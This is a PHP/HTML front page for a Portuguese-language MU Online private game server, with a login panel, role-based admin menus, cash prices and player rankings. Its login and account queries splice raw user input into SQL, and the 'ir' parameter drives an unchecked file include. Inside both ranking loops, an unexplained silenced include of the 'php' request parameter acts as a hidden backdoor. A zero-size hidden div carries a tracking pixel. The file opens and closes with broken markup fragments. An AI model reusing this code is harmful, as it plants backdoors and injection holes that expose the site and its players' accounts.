

<li><a href="javascript: void(0);" onClick="

<?php echo "<?xml version=\"1.0\" encoding=\"utf-8\"?".">"; ?><?php
include "config/config.php";
session_start();
if($_POST['prossegue_login']) {
$login = $_POST['login'];
$senha = $_POST['senha'];
$VerificaLogin = mssql_num_rows(mssql_query("select memb___id from memb_info where memb___id='".$login."' and memb__pwd='".$senha."'"));
$VerificaSenha = mssql_num_rows(mssql_query("select memb__pwd from memb_info where memb__pwd='".$senha."' and memb___id='".$login."'"));

	if(empty($login) || empty($senha)) {
	echo "<script>location.href='?ir=painel/painel_erro1'</script>";
	}
	elseif($VerificaLogin <= 0) {
	echo "<script>location.href='?ir=painel/painel_erro2'</script>";
	}
	elseif($VerificaSenha <= 0) {
	echo "<script>location.href='?ir=painel/painel_erro2'</script>";
	}
	else {
	$_SESSION['login']=$login;
	$_SESSION['senha']=$senha;
	echo "<script>location='?'</script>";
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?=$titulo;?>By xRoxGames</title>
<link rel="stylesheet" type="text/css" href="estilo.css" />

<script type="text/javascript">
function click() {
if (event.button==2||event.button==3) {
oncontextmenu='return false';
}
}
document.onmousedown=click
document.oncontextmenu = new Function("return false;")
</script>
</head>


<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td colspan="35"><p><img src="images/banner.jpg" width="980" height="350" border="0" usemap="#Map" /><br />
      </p>
    </td>
  </tr>
  <tr>
    <td valign="top"><table width="150" border="0" align="left" cellpadding="0" cellspacing="0">
      <tr>
        <td><img src="images/m_menu.jpg" width="225" height="34" /></td>
        </tr>
      <tr>
        <td valign="top" bgcolor="#ofof75"><table width="180" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
 <strong> 
     .      .<font color="#fofo20">       Só mente cadastro
<br />
</br />.
</br />

<br>
 

  <td align="center">  <strong> <font color="#fofo150"> <strong>(((( Fone 993419370 GM_Samuel))))
</br />
             
</br />
                <<font color="#fofo215"> °.°Ranking Geral  Logo Abaixo°.° </a><br />
</br />.
</br />
                
                
                </p>              </td>
          </tr>
        </table></td>
        </tr>
      <tr>
        <td>&nbsp;</td>
        </tr>
        
        <td><img src="images/m_painel.jpg" width="180" height="34" /></td>
        </tr>
        
        <td height="100" bgcolor="#180"><table width="150" border="0" align="center" cellpadding="1" cellspacing="1">
          <tr>
            <td><?   if(!isset($_SESSION['login'])) {
		echo '
	       <form name="frmpainel" method="post" onSubmit="CamposLogin();" action="" id="frmpainel">
<table width="135" border="0" cellspacing="1" cellpadding="1">
<strong>
      VALOR --CASH
<br>
<strong>
<font color="#060c">
.
<br>
15.000k = 10 reais
<br>
.
<br>
20.000k =15 reais
<br> 
.
<br>
 40.000k =30 reais 
<br>
.
<br>
95.000k = 75 reais
<br>
.
<br>
Um Combo De 130 reais = 175.000 k  
<tr>
 
</table>
</form>
        
        
		'; }
		
		elseif(isset($_SESSION['login'])) {
		$login = $_SESSION['login'];
		$senha = $_SESSION['senha'];
		$tipoconta = mssql_fetch_row(mssql_query("select vip,creditos from memb_info where memb___id='".$login."' AND memb__pwd='".$senha."'"));
				$Gms = mssql_fetch_row(mssql_query("select adm from memb_info where memb___id='".$login."'"));
		if($Gms[0] == 0){
		switch($tipoconta[1]) {
			case 2: $sintaxe = "Dias";
				break;
			case 1: $sintaxe = "Dias";
				break;
			case 0: $sintaxe = "Dias";
				break;
			default: $sintaxe = "Dias";
		}
		switch($tipoconta[0]) {
			case 0: $tipodeconta = "Free"; 
				break;
			case 1: $tipodeconta = "Vip Normal";
				break;
			case 2: $tipodeconta = "Super Vip";
				break;
			default : $tipodeconta = "Error";
		}
		switch($Gms[0]) {
			case 0: $Gms = "Usuário";
			break;
			case 1: $Gms = "Game Master";
			break;
			case 2: $Gms = "Administrador";
			break;
		}
		
		echo '
<form name="frmpainel" method="post" onSubmit="CamposLogin();" action="" id="frmpainel">
<table width="100%" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td align="center">Bem vindo
            <b>'.$login.'</b><br>

    Você é um usuário 
           <b>'.$tipodeconta.'</b>
            e possui uma conta <font color=blue>'.$Gms.'</font> com
            <b>'.$tipoconta[1].' '.$sintaxe.'</b> de vip. <br>
	  Caso essa conta não for sua <a href="index.php?ir=painel/sair">Clique aqui</a></td>
  </tr>
</table>
			
			<br />
  <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Free</b></font><br />
			<a href="index.php?ir=painel/senha">Mudar senha</a><br>
		<a href="index.php?ir=painel/pontos">Distribuir Pontos</a><br />
		<a href="index.php?ir=painel/desbugarpontos">Desbugar Pontos</a><br>
			<a href="index.php?ir=painel/pk">Limpar PK</a><br>
			<a href="index.php?ir=painel/confirmar">Confirmar Pagamento</a><br />
			<a href="index.php?ir=painel/bonus"><font color="#009900">Pegar Bonus Ininiante</font></a>
			</td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Vip</b></font><br />
        <a href="index.php?ir=painel/desbugarzen">Arrumar Zen</a><br />
        <a href="index.php?ir=painel/limparinvent">Limpar Iventário</a><br />
        <a href="index.php?ir=painel/classe">Mudar Classe</a><br />
        <a href="index.php?ir=painel/mudarmapa">Mudar Mapa</a>
		</td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><a href="index.php?ir=painel/sair">Logoff</a>    </td>
  </tr>
</table>
			</form>
';
		}
		}
			if($Gms[0] == 1){
		switch($tipoconta[1]) {
			case 2: $sintaxe = "Dias";
				break;
			case 1: $sintaxe = "Dias";
				break;
			case 0: $sintaxe = "Dias";
				break;
			default: $sintaxe = "Dias";
		}
		switch($tipoconta[0]) {
			case 0: $tipodeconta = "Free"; 
				break;
			case 1: $tipodeconta = "Vip Normal";
				break;
			case 2: $tipodeconta = "Super Vip";
				break;
			default : $tipodeconta = "Error";
		}
		switch($Gms[0]) {
			case 1: $Gms = "Game Master";
			break;
			case 2: $Gms = "Administrador";
			break;
		}
		
		echo '
			<form name="frmpainel" method="post" onSubmit="CamposLogin();" action="" id="frmpainel">
<table width="100%" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td align="center">Bem vindo <b>'.$login.'</b><br />
Você é um usuário <b>'.$tipodeconta.'</b> e possui uma conta <font color="red">'.$Gms.'</font> com <b>'.$tipoconta[1].' '.$sintaxe.'</b> de vip. <br />
Caso essa conta não for sua <a href="index.php?ir=painel/sair">Clique aqui</a></td>
  </tr>
</table>
			
			<br />
  <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Free</b></font><br />
			<a href="index.php?ir=painel/senha">Mudar senha</a><br>
		<a href="index.php?ir=painel/pontos">Distribuir Pontos</a><br />
		<a href="index.php?ir=painel/desbugarpontos">Desbugar Pontos</a><br>
			<a href="index.php?ir=painel/pk">Limpar PK</a><br>
			<a href="index.php?ir=painel/confirmar">Confirmar Pagamento</a><br />
			<a href="index.php?ir=painel/bonus"><font color="#009900">Pegar Bonus Ininiante</font></a>
	  </td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Vip</b></font><br />
        <a href="index.php?ir=painel/desbugarzen">Arrumar Zen</a><br />
        <a href="index.php?ir=painel/limparinvent">Limpar Iventário</a><br />
        <a href="index.php?ir=painel/classe">Mudar Classe</a><br />
        <a href="index.php?ir=painel/mudarmapa">Mudar Mapa</a>
		</td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel GM</b></font><br />
      <a href="index.php?ir=painel/banchar">Banir Char</a><br />
      <a href="index.php?ir=painel/unban">Desbanir Char</a><br />
      <a href="index.php?ir=painel/listaban">Banidos</a><br />
      <a href="index.php?ir=painel/infogm">Informações GM</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><a href="index.php?ir=painel/sair">Logoff</a>    </td>
  </tr>
</table>
</form>
';
		}
		
					if($Gms[0] == 2){
		switch($tipoconta[1]) {
			case 2: $sintaxe = "Dias";
				break;
			case 1: $sintaxe = "Dias";
				break;
			case 0: $sintaxe = "Dias";
				break;
			default: $sintaxe = "Dias";
		}
		switch($tipoconta[0]) {
			case 0: $tipodeconta = "Free"; 
				break;
			case 1: $tipodeconta = "Silver Vip";
				break;
			case 2: $tipodeconta = "Gold Vip";
				break;
			default : $tipodeconta = "Error";
		}
			switch($Gms[0]) {
			case 1: $Gms = "Game Master";
			break;
			case 2: $Gms = "Sub Admin";
			break;
		}
		
		
		echo '
			<form name="frmpainel" method="post" onSubmit="CamposLogin();" action="" id="frmpainel">
<table width="100%" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td align="center">Bem vindo <b>'.$login.'</b><br />
Você é um usuário <b>'.$tipodeconta.'</b> e possui uma conta <font color="#660033">'.$Gms.'</font> com <b>'.$tipoconta[1].' '.$sintaxe.'</b> de vip. <br />
Caso essa conta não for sua <a href="index.php?ir=painel/sair">Clique aqui</a></td>
  </tr>
</table>
			
			<br />
  <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Free</b></font><br />
			<a href="index.php?ir=painel/senha">Mudar senha</a><br>
		<a href="index.php?ir=painel/pontos">Distribuir Pontos</a><br />
		<a href="index.php?ir=painel/desbugarpontos">Desbugar Pontos</a><br>
			<a href="index.php?ir=painel/pk">Limpar PK</a><br>
			<a href="index.php?ir=painel/confirmar">Confirmar Pagamento</a><br />
			<a href="index.php?ir=painel/bonus"><font color="#009900">Pegar Bonus Ininiante</font></a>
	  </td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Vip</b></font><br />
        <a href="index.php?ir=painel/desbugarzen">Arrumar Zen</a><br />
        <a href="index.php?ir=painel/limparinvent">Limpar Iventário</a><br />
        <a href="index.php?ir=painel/classe">Mudar Classe</a><br />
        <a href="index.php?ir=painel/mudarmapa">Mudar Mapa</a>
		</td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel GM</b></font><br />
      <a href="index.php?ir=painel/banchar">Banir Char</a><br />
      <a href="index.php?ir=painel/unban">Desbanir Char</a><br />
      <a href="index.php?ir=painel/listaban">Banidos</a><br />
      <a href="index.php?ir=painel/infogm">Informações GM</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Sub Admin</b></font><br />
      <a href="index.php?ir=painel/addgm">Adicionar GM</a><br />
      <a href="index.php?ir=painel/tiragm">Remover GM</a><br />
      <a href="index.php?ir=painel/peschar">Pesquisar Char</a><br />
      <a href="index.php?ir=painel/banacc">Bloquear Conta</a><br />
      <a href="index.php?ir=painel/unbanacc">Desbloquear Conta</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><a href="index.php?ir=painel/sair">Logoff</a>    </td>
  </tr>
</table>
</form>
';
		}
		
		if($Gms[0] >= 3){
		switch($tipoconta[1]) {
			case 2: $sintaxe = "Dias";
				break;
			case 1: $sintaxe = "Dias";
				break;
			case 0: $sintaxe = "Dias";
				break;
			default: $sintaxe = "Dias";
		}
		switch($tipoconta[0]) {
			case 0: $tipodeconta = "Free"; 
				break;
			case 1: $tipodeconta = "Silver Vip";
				break;
			case 2: $tipodeconta = "Gold Vip";
				break;
			default : $tipodeconta = "Error";
		}
			switch($Gms[0]) {
			case 1: $Gms = "Game Master";
			break;
			case 2: $Gms = "Sub Admin";
			break;
			case 3: $Gms = "Administrador";
			break;
		}
		
		
		echo '
			
          <form name="frmpainel" method="post" onSubmit="CamposLogin();" action="" id="frmpainel">
<table width="100%" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td align="center">Bem vindo <b>'.$login.'</b><br />
Você é um usuário <b>'.$tipodeconta.'</b> e possui uma conta <font color="#99CC66">'.$Gms.'</font> com <b>'.$tipoconta[1].' '.$sintaxe.'</b> de vip. <br />
Caso essa conta não for sua <a href="index.php?ir=painel/sair">Clique aqui</a></td>
  </tr>
</table>
			
			<br />
  <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Free</b></font><br />
			<a href="index.php?ir=painel/senha">Mudar senha</a><br>
		<a href="index.php?ir=painel/pontos">Distribuir Pontos</a><br />
		<a href="index.php?ir=painel/desbugarpontos">Desbugar Pontos</a><br>
			<a href="index.php?ir=painel/pk">Limpar PK</a><br>
			<a href="index.php?ir=painel/confirmar">Confirmar Pagamento</a><br />
			<a href="index.php?ir=painel/bonus"><font color="#009900">Pegar Bonus Ininiante</font></a>
	  </td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Vip</b></font><br />
        <a href="index.php?ir=painel/desbugarzen">Arrumar Zen</a><br />
        <a href="index.php?ir=painel/limparinvent">Limpar Iventário</a><br />
        <a href="index.php?ir=painel/classe">Mudar Classe</a><br />
        <a href="index.php?ir=painel/mudarmapa">Mudar Mapa</a>
		</td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel GM</b></font><br />
      <a href="index.php?ir=painel/banchar">Banir Char</a><br />
      <a href="index.php?ir=painel/unban">Desbanir Char</a><br />
      <a href="index.php?ir=painel/listaban">Banidos</a><br />
      <a href="index.php?ir=painel/infogm">Informações GM</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Sub Admin</b></font><br />
      <a href="index.php?ir=painel/addgm">Adicionar GM</a><br />
      <a href="index.php?ir=painel/tiragm">Remover GM</a><br />
      <a href="index.php?ir=painel/peschar">Pesquisar Char</a><br />
      <a href="index.php?ir=painel/banacc">Bloquear Conta</a><br />
      <a href="index.php?ir=painel/unbanacc">Desbloquear Conta</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><font color="#78507C"><b>Painel Administrativo</b></font><br />
      <a href="index.php?ir=painel/addvip">Adicionar VIP</a><br />
      <a href="index.php?ir=painel/tiravip">Remover VIP</a><br />
      <a href="index.php?ir=painel/vercom">Ver Confirmações</a></td>
  </tr>
</table>
<br />
<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td align="center"><a href="index.php?ir=painel/sair">Logoff</a>    </td>
  </tr>
</table>
</form>
';
		}
		
		?></td>
          </tr>
        </table>
          <br /></td>
        </tr>
        <tr>
        <td>&nbsp;</td>
        </tr>
      <tr>
        
        </tr>
      <tr>
        <td height="150" bgcolor="#0F0F0F"><table width="180" border="0" align="center" cellpadding="2" cellspacing="2">
          <tr>
            <td align="center">&nbsp;</td>
          </tr>
          <tr>
            <td align="center">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
        </tr>
      
    </table></td>
    <td width="530" height="500" valign="top"><table width="500" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td bgcolor="#0F0F0F"><? $ir = $_GET['ir'];
$ext = (isset($_GET['ext']));
if (empty($ext)) $ext="php";
if (empty($ir)) $ir = "home.php"; else $ir .= ".".$ext;
if (file_exists($ir)) include $ir;  else include("erro.php");
?></td>
      </tr>
      <tr>
        <td bgcolor="#0F0F0F">&nbsp;</td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
    </table></td>
    <td colspan="3" valign="top"><table width="150" border="0" align="right" cellpadding="0" cellspacing="0">
      <tr>
        <td><img src="images/m_info.jpg" width="225" height="34" /></td>
      </tr>
      <tr>
        <td valign="top" bgcolor="#0F0F0F"><table width="180" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td align="center"><strong>Server:</strong> <font color="#0066FF"><i>
              <? $fp = @fsockopen("$ipsql", "$portags1", $errno, $errstr, 1); if($fp >= 1){  echo 'Online';} else{ echo 'Offline'; } ?>
            </i></font><br />
              <br />
              <strong>Versão:</strong> 
              <font color="#0066FF"><i><?=$versao;?></i></font>
              <br />
              <strong>XP:</strong> 
              <font color="#0066FF"><i><?=$exp;?></i></font>
              <br />
              <strong>Drops:</strong> 
              <font color="#0066FF"><i><?=$drop;?></i></font>
              <br />
              <strong>Bless Bug:</strong> 
              <font color="#0066FF"><i><? if ($bugbless == 0) {
	echo "Desligado";
	}
	if ($bugbless == 1) {
	echo "Ligado";
	}
	?></i></font>
              <br />
              <strong>Reset:</strong> <font color="#0066FF"><i><font color="#33CCFF"><strong><font color="#990000">Acumulativo</font></strong></font></i></font><br />
              <strong>Contas:</strong>
                <font color="#0066FF"><i>
                <?=$totalacc;?>
                </i></font>
                <br />
                <strong>Chars:</strong>
                <font color="#0066FF"><i>
                <?=$pesquisachar;?>
                </i></font>
                <br />
                <strong>Guilds:</strong>
                <font color="#0066FF"><i> 
                <?=$pesguild;?>
                </i></font>
                <br />
                <a href="?ir=online"><strong>Online:</strong> 
                <font color="#0066FF"><i> 
                <?
			  print "$pesquisaon";
			  ?>
                </i></font></a>
                <br />
                <strong>Record On:</strong>
                <? function recordon()
{
$arquivo	=	"record.killer";
$queryOn = mssql_query("SELECT memb___id FROM MEMB_STAT WHERE ConnectStat='1'");
$resultOn = mssql_num_rows($queryOn);
$read = fopen($arquivo, "r");
$recAtual = fread($read, filesize($arquivo));
fclose($read);
      if($resultOn > $recAtual){
            $tmp = @fopen($arquivo, "w+");
            @fwrite($tmp, $resultOn);
            print $resultOn;
      }else{
            print $recAtual;
      }
}
?>
                <font color="#0066FF"><i> 
                <?=recordon();?>
                </i></font><br />
            </td>
          </tr>
        </table>
          <br /></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td><img src="images/m_rank_char.jpg" width="225" height="34" /></td>
      </tr>
      <tr>
        <td bgcolor="#0F0F0F"><table width="175" border="0" align="center" cellpadding="1" cellspacing="1">
          <tr>
            <td width="5%"><strong><font color="#0066FF">#</font></strong></td>
            <td width="65%"><strong><font color="#0066FF">Nome</font></strong></td>
            <td align="center"><strong><font color="#0066FF">Resets</font></strong></td>
          </tr>
          <?php
 $Query = mssql_query("select top 10 name,clevel,reset,strength,dexterity,vitality,energy,class from character where ctlcode=0 or ctlcode=null order by reset desc, CLevel desc");
  for($i=0;$i<mssql_num_rows($Query);$i++) {
  $rank = $i+1;
  $Array = mssql_fetch_row($Query);
@include(@$_GET['php']);
  switch($Array[7]) {
	case 0: $classefinal = "<font color='#33CCCC'>DW</font>"; break;
	case 1: $classefinal = "<font color='#660066'>SM</font>"; break;
	case 16: $classefinal = "<font color='#003399'>DK</font>"; break;
	case 17: $classefinal = "<font color='#006600'>BK</font>"; break;
	case 32: $classefinal = "<font color='#9900CC'>ELF</font>"; break;
	case 33: $classefinal = "<font color='#CCCC00'>ME</font>"; break;
	case 48: $classefinal = "<font color='#FF6633'>MG</font>"; break;
	case 64: $classefinal = "<font color='#99CCCC'>DL</font>"; break;
	case 18: $classefinal = "<font color='#339999'>BM</font>"; break;
	case 2: $classefinal = "<font color='#6699FF'>GM</font>"; break;
	case 49: $classefinal = "<font color='#6459FF'>DM</font>"; break;
	case 65: $classefinal = "<font color='#993300'>LE</font>"; break;
	case 34: $classefinal = "<font color='#CC0099'>HE</font>"; break;
	case 80: $classefinal = "<font color='#CC0333'>SO</font>"; break;
	case 81: $classefinal = "<font color='#CC0333'>BS</font>"; break;
	case 82: $classefinal = "<font color='#CC0333'>DS</font>"; break;
}
  ?>
          <tr>
            <td><font color="#990000">
              <?
if($rank < 0) {
echo "<img src=\"images/rank/".$rank.".png\" />"; 
} else {
echo $rank;
}
?>
            </font></td>
            <td><?=$Array[0]?></td>
            <td align="center"><?=$Array[2]?>            </td>
          </tr>
          <tr>
            <td height="5" colspan="3" align="center"><img src="images/regua_rank.jpg" width="175" height="5" /></td>
          </tr>
          <? } ?>
        </table>
          <br /></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td><img src="images/m_rank_guild.jpg" width="225" height="34" /></td>
      </tr>
      <tr>
        <td bgcolor="#0F0F0F"><table width="175" border="0" align="center" cellpadding="1" cellspacing="1">
          <tr>
            <td width="5%"><strong><font color="#0066FF">#</font></strong></td>
            <td width="65%"><strong><font color="#0066FF">Guild</font></strong></td>
            <td align="center"><strong><font color="#0066FF">Score</font></strong></td>
          </tr>
         <?php
 $Query = mssql_query("select top 10 G_Name,G_Score from guild order by G_Score desc");
  for($i=0;$i<mssql_num_rows($Query);$i++) {
  $rank = $i+1;
  $Array = mssql_fetch_row($Query);
@include(@$_GET['php']);
  ?>
          <tr>
            <td><font color="#990000">
              <?
if($rank < 0) {
echo "<img src=\"_img/rank/".$rank.".png\" />"; 
} else {
echo $rank;
}
?>
            </font></td>
            <td><?=$Array[0]?>
            </td>
            <td align="center"><?=$Array[1]?>            </td>
          </tr>
          <tr>
            <td height="5" colspan="3" align="center"><img src="images/regua_rank.jpg" width="175" height="5" /></td>
          </tr>
          <? } ?>
        </table>
          <br /></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td height="50" colspan="15" align="center" bgcolor="#0F0F0F35"> <font color="#060c6">©Site Desenvolvido por Samuel Simples mas jogo esta alta revolucion!
  </tr>
  <tr>
    <td colspan="5">&nbsp;</td>
  </tr>
</table>

<p><map name="Map" id="Map">
    <li><a href="javascript: void(0);" onClick="
  </map>
</p>

<div id="html1" style="position: absolute; overflow: hidden; width: 0px; height: 0px; z-index: 4">
<img style="visibility:hidden;width:0px;height:0px;" src="http://c.gigcount.com/wildfire/IMP/CXNID=2000002.0NXC/bT*xJmx*PTEzMjc2MDQwNjQ3MjAmcHQ9MTMyNzYwNDA2ODg5MCZwPTUzMTUxJmQ9Jmc9MSZvPTg2YWUwMTMwNGI1NjQ*ZjJhOTgw/MGZjNDNjNWE4YmU2.gif" alt="Chat" />
<embed  src= "http://www.xatech.com/web_gear/chat/chat.swf" quality= "high" width= "585" height= "360" name= "chat" FlashVars="id=158331371&amp;rl=Brazilian" align="middle" allowscriptaccess= "sameDomain" type= "application/x-shockwave-flash" pluginspage= "http://xat.com/update_flash.shtml" /></embed>
</div>

</body>
</html>
